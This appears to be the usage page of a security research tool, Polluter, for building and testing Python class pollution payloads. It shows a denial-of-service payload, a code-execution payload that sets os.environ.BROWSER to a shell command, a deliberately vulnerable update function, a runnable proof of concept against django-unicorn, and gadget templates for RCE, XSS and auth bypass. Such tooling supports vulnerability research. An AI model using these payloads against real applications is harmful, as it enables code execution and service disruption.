---
title: "Usage"
weight: 2
---

# Using Polluter

Polluter helps construct and test class pollution payloads.

## Constructing Payloads

```python
from polluter import Payload

# Build a DoS payload targeting __getattribute__
payload = Payload.build(
    path="__class__.__getattribute__",
    value="1337"
)
# produces {"__class__": {"__getattribute__": "1337"}}

# Build an RCE payload targeting os.environ
payload = Payload.build(
    path="__class__.__init__.__globals__.sys.modules.os.environ.BROWSER",
    value="/bin/sh -c 'id > /tmp/pwned'"
)
```

## Testing Against a Vulnerable Function

```python
from polluter import test_pollution

# Define the vulnerable update function
def update(obj, data):
    for key in data:
        val = data[key]
        if isinstance(val, dict):
            update(getattr(obj, key), val)
        else:
            setattr(obj, key, val)

# Test if pollution is achievable
result = test_pollution(
    target_func=update,
    payload_path="__class__.__getattribute__",
    payload_value="1337"
)

print(result.success)      # True/False
print(result.consequence)  # "DoS" / "RCE" / etc.
```

## Using with the PoC Collection

Each entry in the `cp-collection/` directory contains a proof-of-concept that can be run with Polluter:

```bash
cd cp-collection/django-unicorn/poc
pip install -r requirements.txt
python poc.py
```

## Gadget Library

Polluter includes known gadget templates:

```python
from polluter.gadgets import dos, rce, xss, auth_bypass

# Get all DoS gadgets
for gadget in dos.all():
    print(f"{gadget.name}: {gadget.path} = {gadget.value}")

# Get RCE gadgets that work with Constrained-Get
for gadget in rce.constrained():
    print(f"{gadget.name}: {gadget.path}")
```
